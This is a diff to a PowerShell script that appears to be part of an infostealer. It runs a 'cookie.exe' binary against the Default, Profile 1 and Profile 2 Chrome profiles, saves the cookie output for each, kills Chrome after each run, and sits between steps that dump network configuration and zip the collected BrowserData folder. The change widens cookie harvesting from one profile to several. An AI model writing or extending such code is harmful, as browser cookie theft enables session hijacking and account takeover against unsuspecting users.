@@ -275,33 +275,53 @@ $networkConfigFile = Join-Path -Path $destDir -ChildPath "NetworkConfig.txt"
 $networkConfig | Out-File -FilePath $networkConfigFile
 Write-Host "Network configuration saved."
 
-# Function to run cookie.exe, open Chrome before running, and close Chrome after
+# Function to run cookie.exe, open Chrome with different profiles, and close Chrome after
 function RunCookieExe {
     $cookieExePath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie.exe"
-    $cookieOutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output.txt"
+    
+    # Output paths for different profiles
+    $defaultOutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_default.txt"
+    $profile1OutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_profile1.txt"
+    $profile2OutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_profile2.txt"
 
-    # Start Chrome using 'start chrome' command
-    start chrome
-    Start-Sleep -Seconds 3 # Wait for Chrome to open (you can adjust the sleep time)
-    Write-Host "Chrome opened."
+    # Function to start Chrome with a specified profile and run cookie.exe
+    function StartChromeAndRunCookie {
+        param (
+            [string]$profileDir,
+            [string]$outputPath
+        )
 
-    # Run cookie.exe and save output
-    if (Test-Path $cookieExePath) {
-        $cookieCommand = & $cookieExePath 2>&1
-        $cookieCommand | Out-File -FilePath $cookieOutputPath
-        Write-Host "Chrome - cookie.exe output saved to: $cookieOutputPath"
-    } else {
-        Write-Host "Chrome - cookie.exe not found."
+        # Start Chrome with the specified profile
+        start chrome --profile-directory=$profileDir
+        Start-Sleep -Seconds 3 # Wait for Chrome to open (you can adjust the sleep time)
+        Write-Host "Chrome opened with profile: $profileDir"
+
+        # Run cookie.exe and save output
+        if (Test-Path $cookieExePath) {
+            $cookieCommand = & $cookieExePath 2>&1
+            $cookieCommand | Out-File -FilePath $outputPath
+            Write-Host "Output saved to: $outputPath"
+        } else {
+            Write-Host "cookie.exe not found."
+        }
+
+        # Close Chrome after executing cookie.exe
+        Stop-Process -Name "chrome" -Force
+        Write-Host "Chrome closed."
     }
 
-    # Close Chrome after executing cookie.exe
-    Stop-Process -Name "chrome" -Force
-    Write-Host "Chrome closed."
+    # Run for default profile
+    StartChromeAndRunCookie -profileDir "Default" -outputPath $defaultOutputPath
+
+    # Run for Profile 1
+    StartChromeAndRunCookie -profileDir "Profile 1" -outputPath $profile1OutputPath
+
+    # Run for Profile 2
+    StartChromeAndRunCookie -profileDir "Profile 2" -outputPath $profile2OutputPath
 }
 
 # Call the function after other operations
 RunCookieExe
-
 
 # Zip the BrowserData folder
 $zipDir = "$env:APPDATA\ZippedBrowserData"
